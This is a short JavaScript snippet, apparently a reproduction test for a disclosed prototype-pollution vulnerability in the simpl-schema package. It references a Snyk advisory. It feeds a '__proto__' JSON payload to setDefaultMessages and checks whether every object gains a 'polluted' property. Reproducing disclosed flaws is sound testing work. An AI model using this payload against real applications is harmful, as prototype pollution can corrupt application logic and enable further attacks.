// //https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
// test("prototype pollution in simpl-schema", () => {
  const SimpleSchema = require("simpl-schema").default;
  let obj = {};

console.log({}.polluted);

  SimpleSchema.setDefaultMessages(
    JSON.parse('{"__proto__":{"polluted":"yes"}}')
  );
console.log({}.polluted);
// });
